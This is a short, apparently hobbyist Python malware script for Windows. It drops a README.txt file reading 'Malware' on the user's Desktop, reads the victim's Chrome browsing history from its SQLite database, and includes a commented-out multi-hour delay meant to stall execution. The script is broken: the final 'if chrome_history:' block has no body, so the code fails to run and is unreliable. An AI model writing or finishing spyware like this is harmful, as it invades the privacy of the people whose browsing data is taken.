import os
import random
from time import sleep
import sqlite3


HACKER_FILE_NAME = 'README.txt'

def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return []


def create_hacker_file(user_path):
    hacker_file = open(user_path +"\\Desktop\\"+ HACKER_FILE_NAME, "w")
    hacker_file.write("Malware")
    return hacker_file


def main():
    n_hours = random.randrange(1, 4)
    # sleep(n_hours * 60 * 60)
    user_path = "C:\\Users\\" + os.getlogin()
    hacker_file = create_hacker_file(user_path)
    chrome_history = get_chrome_history(user_path)
    if chrome_history:



if __name__ == "__main__":
    main()
